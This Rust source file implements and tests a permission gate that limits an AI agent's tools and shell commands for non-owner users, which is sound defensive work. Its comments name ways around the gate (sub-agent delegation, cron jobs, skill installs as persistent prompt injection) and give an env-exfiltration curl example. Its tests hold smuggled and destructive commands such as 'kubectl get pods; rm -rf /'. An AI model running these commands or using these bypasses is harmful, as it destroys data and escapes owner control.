//! Per-role capability ceiling for **normal users** (non-owners) on multi-user
//! channels.
//!
//! Owners (senders in `channels_config.approval_owners`) get the full toolset.
//! Everyone else who is allowed to chat is a *guest*, and their turns run under
//! a [`GuestGate`]: a tool the agent calls on a guest's behalf must be
//! permitted, and if it's `shell`, the command must match one of the guest
//! command globs. Anything else is denied outright (a hard ceiling — never
//! escalated to an owner).
//!
//! Built per turn at the channel/gateway entry from config; `None` means "no
//! restriction" (owner, CLI, or console-authenticated user).

use std::collections::HashSet;

/// The capability ceiling applied to a single non-owner ("guest") turn.
#[derive(Debug, Clone)]
pub struct GuestGate {
    /// Tools a guest may use: exactly `channels_config.guest_allowed_tools`.
    /// The owner's `autonomy.auto_approve` list is **not** unioned in.
    permitted_tools: HashSet<String>,
    /// Shell-command glob patterns a guest may run (`channels_config.guest_allowed_commands`).
    allowed_commands: Vec<String>,
}

impl GuestGate {
    /// Build a gate from the operator-configured guest allowances only.
    ///
    /// `guest_tools` is the exact permitted set: the agent will call **only**
    /// these tools on a guest's behalf. The owner's `autonomy.auto_approve`
    /// list is intentionally **not** unioned in: that list governs the owner's
    /// own approval flow, not what a guest may use. An operator who wants a
    /// guest to be able to read files or recall memory must list those tools
    /// in `channels_config.guest_allowed_tools`. Empty `guest_tools` (the
    /// default) means the agent calls no tool on a guest's behalf; the guest
    /// can still chat.
    pub fn new(guest_tools: &[String], guest_commands: &[String]) -> Self {
        Self {
            permitted_tools: guest_tools.iter().cloned().collect(),
            allowed_commands: guest_commands.to_vec(),
        }
    }

    /// Tools that are **owner-only**, no matter what `guest_allowed_tools`
    /// says — even if an owner adds one by mistake. Checked before the allowlist.
    /// Three reasons a tool lands here:
    ///   * it mutates authority itself (`manage_permissions` — who owns the bot;
    ///     `issue_pairing_code` — mints a code that can promote its recipient to
    ///     owner, so a guest minting one would be an authority escalation);
    ///   * it executes code outside this gate's reach, so the guest ceiling
    ///     can't constrain it:
    ///       - `delegate` spawns a sub-agent loop with NO guest gate, so any tool
    ///         the sub-agent is allowed runs unconstrained — a full bypass;
    ///       - `ssh` / `pty` run arbitrary commands on a remote host / live tmux
    ///         session and don't carry a glob-checkable single command;
    ///       - `cron_add` / `cron_update` persist an **agent** job whose later
    ///         scheduled run calls `crate::agent::run(...)` with the full toolset
    ///         and NO guest gate — the same deferred sub-loop bypass as
    ///         `delegate`, just fired later; `cron_run` triggers that run
    ///         immediately. Read-only `cron_list` / `cron_runs` stay allowed;
    ///   * it injects instructions into the system prompt for every later turn,
    ///     which this per-turn gate can't later constrain:
    ///       - `author_skill` / `skills_install` write a new skill (local
    ///         authoring or an arbitrary ClawHub download) that the agent picks
    ///         up on the next turn — a persistent prompt-injection primitive;
    ///       - `skills_install_deps` shells out to a package manager
    ///         (brew/uv/npm/go) on the skill's behalf.
    pub const OWNER_ONLY_TOOLS: &'static [&'static str] = &[
        "manage_permissions",
        "issue_pairing_code",
        "delegate",
        "ssh",
        "pty",
        // Persists proxy config and can rewrite the whole process's egress
        // (HTTP(S)_PROXY) — same config-mutating/traffic-redirecting class as
        // the tools above, so a guest must never reach it.
        "proxy_config",
        "author_skill",
        "skills_install",
        "skills_install_deps",
        "cron_add",
        "cron_update",
        "cron_run",
        // Deleting a scheduled job is a mutation a guest must not perform (job
        // tampering / denial of the owner's schedule) — read-only cron_list /
        // cron_runs stay allowed.
        "cron_remove",
    ];

    /// Whether a guest may invoke `tool` at all. Owner-only tools are always
    /// denied; otherwise the tool must be in the permitted set.
    pub fn tool_permitted(&self, tool: &str) -> bool {
        if Self::OWNER_ONLY_TOOLS.contains(&tool) {
            return false;
        }
        self.permitted_tools.contains(tool)
    }

    /// Whether a guest may run shell `command`. Conservative: the command must
    /// be a single simple command (no chaining/pipe/redirect/subshell — those
    /// could smuggle a non-allowlisted command past the glob) AND match one of
    /// the configured globs.
    pub fn command_permitted(&self, command: &str) -> bool {
        let cmd = command.trim();
        if cmd.is_empty() {
            return false;
        }
        // Reject any shell metacharacter that could chain, redirect, or inject a
        // second command — a guest only runs one plain command. Commands run via
        // `sh -c`, so ANY `$` is rejected: it covers command substitution `$(…)`,
        // parameter expansion `${…}`/`$VAR` (env exfiltration, e.g.
        // `curl host?x=$SECRET`), and ANSI-C quoting `$'\n…'` (smuggles control
        // bytes / separators on shells where /bin/sh is bash). Backticks and the
        // redirect/chain/subshell operators are blocked alongside.
        const FORBIDDEN: &[&str] = &[
            "`", "$", "<(", ">(", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "\t",
        ];
        if FORBIDDEN.iter().any(|m| cmd.contains(m)) {
            return false;
        }
        self.allowed_commands.iter().any(|p| glob_match(p, cmd))
    }

    /// Decision for a single tool call. `arguments` is the parsed call args
    /// (used to extract the shell command). Returns `None` if permitted, or
    /// `Some(reason)` to deny with that message.
    pub fn deny_reason(&self, tool: &str, arguments: &serde_json::Value) -> Option<String> {
        if Self::OWNER_ONLY_TOOLS.contains(&tool) {
            return Some(format!(
                "The `{tool}` tool is owner-only and cannot be used by non-owner users \
                 (it changes who owns the bot). An owner must do this. {}",
                Self::how_to_become_owner_sentence()
            ));
        }
        if !self.tool_permitted(tool) {
            return Some(format!(
                "The `{tool}` tool isn't available to non-owner users on this channel. \
                 Ask an owner to run it, or to add it to the guest allowlist. {}",
                Self::how_to_become_owner_sentence()
            ));
        }
        // Shell is permitted as a tool — now gate the specific command.
        if is_shell_tool(tool) {
            let command = arguments
                .get("command")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("")
                .to_string();
            if !self.command_permitted(&command) {
                return Some(format!(
                    "As a non-owner you can only run commands an owner has allowlisted for guests \
                     (and only simple, single commands). `{}` isn't permitted. {}",
                    command.trim(),
                    Self::how_to_become_owner_sentence()
                ));
            }
        }
        // Path-bearing tools (file_read, file_write, pdf_read, image_info)
        // may still try to read `MEMORY.md`, `USER.md`, or anything under
        // `memory/` even when they are in `guest_allowed_tools`. The owner's
        // profile and notes are private to the owner; deny with the same
        // single sentence regardless of which tool tried. Operates even when
        // the operator listed the tool for guests — that listing is the
        // capability grant, not a privacy override.
        if is_path_tool(tool) {
            let path = arguments
                .get("path")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("");
            if is_private_owner_path(path) {
                return Some(format!(
                    "This file is private to the owner. {}",
                    Self::how_to_become_owner_sentence()
                ));
            }
        }
        None
    }

    /// One-line trailing sentence every guest denial carries: the real path to
    /// becoming an owner, instead of the misleading "ask an owner to add you to
    /// the allowlist" wording some denials used to give. The channel name is
    /// not in scope here, so it is left as the literal placeholder the operator
    /// reads as "the channel they are chatting on".
    fn how_to_become_owner_sentence() -> &'static str {
        "To become an owner, ask a current owner to run \
         `rantaiclaw channels pair --channel <channel>` on the host, \
         then `/claim <code>` in this chat."
    }
}

/// Tools whose calls carry a shell `command` argument to gate.
fn is_shell_tool(tool: &str) -> bool {
    matches!(tool, "shell" | "bash" | "run_command")
}

/// Tools whose calls reach the workspace on a path argument. Plan 450 keeps
/// a guest from reading the owner's profile (`USER.md`) or notes
/// (`MEMORY.md`) directly even when the operator lists one of these tools in
/// `guest_allowed_tools`. The dispatch makes sure `USER.md` and `MEMORY.md`
/// are skipped in the system prompt's identity section, so a guest should
/// never see that content in the prompt either — these extra checks stop
/// a guest's tool call from reopening the path through `file_read`.
fn is_path_tool(tool: &str) -> bool {
    matches!(tool, "file_read" | "file_write" | "pdf_read" | "image_info")
}

/// Last path component (case-insensitive). `MEMORY.md`, `USER.md`, and
/// `user.md` all match; `./MEMORY.md`, `memory/brain.db`, and
/// `<workspace>/memory/2026-09-01.md` all match by their `memory` component.
fn is_private_owner_path(path: &str) -> bool {
    if path.trim().is_empty() {
        return false;
    }
    let normalized = path.replace('\\', "/");
    let lowered = normalized.to_ascii_lowercase();
    // Last component is `MEMORY.md` or `USER.md`, case-insensitive. ".//USER.md"
    // and "/foo/USER.md" both have `USER.md` as their last segment.
    let last = lowered.rsplit('/').next().unwrap_or("");
    if matches!(last, "memory.md" | "user.md") {
        return true;
    }
    // Any `memory` path component catches the day's `memory/brain.db`,
    // `memory/2026-09-01.md`, etc. The owner keeps those; a guest does not.
    lowered.split('/').any(|seg| seg == "memory")
}

/// Anchored glob match supporting `*` (matches any run of characters, incl.
/// empty). Case-sensitive. `"kubectl get *"` matches `"kubectl get pods -n x"`.
fn glob_match(pattern: &str, text: &str) -> bool {
    fn helper(p: &[u8], t: &[u8]) -> bool {
        match p.first() {
            None => t.is_empty(),
            Some(&b'*') => helper(&p[1..], t) || (!t.is_empty() && helper(p, &t[1..])),
            Some(&c) => !t.is_empty() && t[0] == c && helper(&p[1..], &t[1..]),
        }
    }
    helper(pattern.as_bytes(), text.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn gate() -> GuestGate {
        GuestGate::new(
            &["shell".to_string(), "web_search".to_string()],
            &[
                "kubectl get *".to_string(),
                "kubectl describe *".to_string(),
                "ls".to_string(),
            ],
        )
    }

    #[test]
    fn glob_matches_anchored_with_star() {
        assert!(glob_match("kubectl get *", "kubectl get pods"));
        assert!(glob_match(
            "kubectl get *",
            "kubectl get pods -n kube-system"
        ));
        assert!(glob_match("ls", "ls"));
        assert!(!glob_match("kubectl get *", "kubectl delete pods"));
        assert!(!glob_match("ls", "ls -la")); // anchored — no trailing wildcard
        assert!(!glob_match("kubectl get *", "xkubectl get pods")); // anchored start
    }

    #[test]
    fn safe_and_allowed_tools_permitted_others_denied() {
        // The operator lists exactly `shell` and `web_search` for guests. The
        // always-safe `file_read` and `memory_recall` (in the owner's
        // `autonomy.auto_approve` list) must NOT be unioned in: a guest must
        // only get what `guest_allowed_tools` lists.
        let g = gate();
        assert!(g.tool_permitted("web_search")); // explicit guest tool
        assert!(g.tool_permitted("shell")); // explicit guest tool
                                            // The always-safe tools are NOT in `guest_allowed_tools` and must stay
                                            // denied for guests — this is the whole point of plan 449.
        assert!(!g.tool_permitted("file_read"));
        assert!(!g.tool_permitted("memory_recall"));
        assert!(!g.tool_permitted("file_write")); // not allowed
        assert!(!g.tool_permitted("ssh"));
    }

    #[test]
    fn shell_command_ceiling() {
        let g = gate();
        assert!(g.command_permitted("kubectl get pods"));
        assert!(g.command_permitted("kubectl describe pod x"));
        assert!(g.command_permitted("ls"));
        // off-list verb
        assert!(!g.command_permitted("kubectl delete pod x"));
        // injection / chaining blocked even though prefix matches
        assert!(!g.command_permitted("kubectl get pods; rm -rf /"));
        assert!(!g.command_permitted("kubectl get pods && rm -rf /"));
        assert!(!g.command_permitted("kubectl get pods | tee /etc/x"));
        assert!(!g.command_permitted("kubectl get pods > /etc/x"));
        assert!(!g.command_permitted("kubectl get $(whoami)"));
        // any `$` is rejected: command sub, param expansion (env exfil), ANSI-C
        assert!(!g.command_permitted("kubectl get ${IFS}pods"));
        assert!(!g.command_permitted("kubectl get $HOME"));
        assert!(!g.command_permitted("kubectl get $'\\n'pods")); // literal $'\n' in the command string
                                                                 // tab as a separator is rejected
        assert!(!g.command_permitted("kubectl get\tpods"));
        assert!(!g.command_permitted(""));
    }

    #[test]
    fn owner_only_tools_never_permitted_for_guests() {
        // Even if an owner mistakenly adds `manage_permissions` to the guest
        // allowlist, the hard owner-only denylist still blocks it.
        let g = GuestGate::new(
            &[
                "manage_permissions".to_string(),
                "issue_pairing_code".to_string(),
                "delegate".to_string(),
                "ssh".to_string(),
                "pty".to_string(),
                "proxy_config".to_string(),
            ],
            &[],
        );
        for tool in [
            "manage_permissions",
            "issue_pairing_code",
            "delegate",
            "ssh",
            "pty",
            "proxy_config",
        ] {
            assert!(!g.tool_permitted(tool), "{tool} must stay owner-only");
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
    }

    #[test]
    fn guest_denied_skill_write_tools_even_when_allowlisted() {
        // Owner explicitly (mis)configured these into guest_allowed_tools.
        let g = GuestGate::new(
            &[
                "skills_install".to_string(),
                "author_skill".to_string(),
                "skills_install_deps".to_string(),
            ],
            &[],
        );
        assert!(!g.tool_permitted("skills_install"));
        assert!(!g.tool_permitted("author_skill"));
        assert!(!g.tool_permitted("skills_install_deps"));
        for tool in ["skills_install", "author_skill", "skills_install_deps"] {
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
    }

    #[test]
    fn guest_denied_cron_mutation_tools_but_allowed_read_only() {
        // Owner (mis)configured all five cron tools into guest_allowed_tools.
        let g = GuestGate::new(
            &[
                "cron_add".to_string(),
                "cron_update".to_string(),
                "cron_run".to_string(),
                "cron_remove".to_string(),
                "cron_list".to_string(),
                "cron_runs".to_string(),
            ],
            &[],
        );
        // The mutation/trigger tools stay owner-only even when allowlisted:
        // each persists, fires, or deletes an agent job the guest ceiling can't
        // constrain.
        for tool in ["cron_add", "cron_update", "cron_run", "cron_remove"] {
            assert!(!g.tool_permitted(tool), "{tool} must stay owner-only");
            let reason = g.deny_reason(tool, &json!({})).unwrap();
            assert!(reason.contains("owner-only"), "{tool}: {reason}");
            assert!(
                reason.contains("channels pair"),
                "{tool}: not told how to become an owner: {reason}"
            );
            assert!(
                reason.contains("/claim"),
                "{tool}: not told how to become an owner: {reason}"
            );
        }
        // Read-only cron tools must remain usable by guests when allowlisted.
        assert!(g.tool_permitted("cron_list"));
        assert!(g.tool_permitted("cron_runs"));
    }

    #[test]
    fn deny_reason_paths() {
        let g = gate();
        // disallowed tool — also assert the wording names the owner-pair flow,
        // so a regression that drops the helper from this arm (the only one of
        // the three that no other test exercises the wording of) is caught.
        let disallowed_reason = g
            .deny_reason("file_write", &json!({}))
            .expect("file_write is not in the gate and must be denied");
        assert!(
            disallowed_reason.contains("channels pair"),
            "tool-not-permitted arm must name the owner-pair flow: {disallowed_reason:?}"
        );
        assert!(
            disallowed_reason.contains("/claim"),
            "tool-not-permitted arm must name /claim: {disallowed_reason:?}"
        );
        // allowed explicit guest tool
        assert!(g.deny_reason("web_search", &json!({})).is_none());
        // shell allowed + command allowed
        assert!(g
            .deny_reason("shell", &json!({"command": "kubectl get pods"}))
            .is_none());
        // shell allowed + command denied
        assert!(g
            .deny_reason("shell", &json!({"command": "rm -rf /"}))
            .is_some());
    }

    #[test]
    fn deny_reason_shell_command_path_names_the_owner_pair_flow() {
        let g = GuestGate::new(&["shell".to_string()], &["ls".to_string()]);
        let reason = g
            .deny_reason("shell", &json!({"command": "rm -rf /"}))
            .expect("a non-allowlisted shell command must deny");
        assert!(
            reason.contains("owner"),
            "the shell denial must still mention owner wording; got: {reason:?}"
        );
        assert!(
            reason.contains("channels pair"),
            "the shell denial must name the owner-pair flow; got: {reason:?}"
        );
        assert!(
            reason.contains("/claim"),
            "the shell denial must name the /claim reply; got: {reason:?}"
        );
    }

    #[test]
    fn empty_guest_list_permits_nothing() {
        // The default install: `guest_allowed_tools = []`. The agent calls no
        // tool on a guest's behalf, including the always-safe `file_read` and
        // `memory_recall` the owner's `auto_approve` list carries.
        let g = GuestGate::new(&[], &[]);
        for tool in ["file_read", "memory_recall", "web_search", "shell"] {
            assert!(
                !g.tool_permitted(tool),
                "{tool} must be denied for a guest with an empty allowlist"
            );
        }
        let reason = g
            .deny_reason("file_read", &json!({}))
            .expect("file_read must be denied");
        assert!(
            reason.contains("isn't available to non-owner users"),
            "denial must use the non-owner-available wording: {reason:?}"
        );
        assert!(
            reason.contains("channels pair"),
            "denial must name the owner-pair flow: {reason:?}"
        );
        assert!(
            reason.contains("/claim"),
            "denial must name /claim: {reason:?}"
        );
    }

    // ────────────────────────────────────────────────────────────────
    // Plan 450: private-path rule. The owner's profile (`USER.md`) and
    // notes (`MEMORY.md`) are owner-private even when the operator
    // adds the path tools to `guest_allowed_tools`. The dispatch also
    // skips those files in the guest prompt, so a guest should never
    // see the content; the rule here closes the bypass where the model
    // could `file_read` the same path directly.
    #[test]
    fn guest_path_tool_blocked_on_memory_md() {
        let g = GuestGate::new(
            &[
                "file_read".to_string(),
                "file_write".to_string(),
                "pdf_read".to_string(),
                "image_info".to_string(),
            ],
            &[],
        );
        for tool in ["file_read", "file_write", "pdf_read", "image_info"] {
            // Plain
            let r = g
                .deny_reason(tool, &json!({"path": "MEMORY.md"}))
                .unwrap_or_else(|| panic!("{tool} on MEMORY.md must deny"));
            assert!(r.contains("private to the owner"), "{tool}: {r}");
            assert!(r.contains("/claim"), "{tool}: {r}");
            // Case-insensitive on the filename
            let r2 = g
                .deny_reason(tool, &json!({"path": "memory.md"}))
                .unwrap_or_else(|| panic!("{tool} on memory.md must deny (case-insensitive)"));
            assert!(r2.contains("private to the owner"), "{tool}: {r2}");
            // User.md too
            let r3 = g
                .deny_reason(tool, &json!({"path": "USER.md"}))
                .unwrap_or_else(|| panic!("{tool} on USER.md must deny"));
            assert!(r3.contains("private to the owner"), "{tool}: {r3}");
            // Anything under `memory/`
            let r4 = g
                .deny_reason(tool, &json!({"path": "memory/2026-09-26.md"}))
                .unwrap_or_else(|| panic!("{tool} on memory/<file> must deny"));
            assert!(r4.contains("private to the owner"), "{tool}: {r4}");
            // Nested USER.md
            let r5 = g
                .deny_reason(tool, &json!({"path": "/var/lib/rantaiclaw/USER.md"}))
                .unwrap_or_else(|| panic!("{tool} on nested USER.md must deny"));
            assert!(r5.contains("private to the owner"), "{tool}: {r5}");
            // Backslash-normalized too
            let r6 = g
                .deny_reason(tool, &json!({"path": "memory\\2026-09-26.md"}))
                .unwrap_or_else(|| panic!("{tool} on backslash memory path must deny"));
            assert!(r6.contains("private to the owner"), "{tool}: {r6}");
        }
    }

    #[test]
    fn guest_path_tool_allowed_on_non_private_paths() {
        let g = GuestGate::new(&["file_read".to_string()], &[]);
        // Plain files in the workspace stay readable when allowlisted.
        assert!(g
            .deny_reason("file_read", &json!({"path": "notes.txt"}))
            .is_none());
        // Directories named `something_memory` (not `memory`) are fine.
        assert!(g
            .deny_reason("file_read", &json!({"path": "memoryless/foo.md"}))
            .is_none());
        // Empty / missing path → no privacy verdict (gate sees no reason to deny).
        assert!(g.deny_reason("file_read", &json!({})).is_none());
        // Filename happens to contain `memory` but is not the special path.
        assert!(g
            .deny_reason("file_read", &json!({"path": "team_memory.md"}))
            .is_none());
    }

    #[test]
    fn guest_path_rule_applies_to_non_path_tools_too() {
        // The path rule is keyed on `path_tools` (file_read, file_write,
        // pdf_read, image_info). A tool that takes a non-path argument
        // (e.g. `shell`) must keep its existing semantics — the rule does
        // not silently widen to other tools.
        let g = GuestGate::new(&["shell".to_string()], &["*".to_string()]);
        // The wildcard command lets the shell ceiling pass, so the test can
        // prove the path rule does not fire on shell. shell allowed + a
        // private-path argument → governed by the shell arm, not the path arm.
        // No path because the rule doesn't fire on shell and "MEMORY.md" isn't
        // a command the gate parses.
        assert!(g
            .deny_reason("shell", &json!({"command": "MEMORY.md"}))
            .is_none());
    }
}
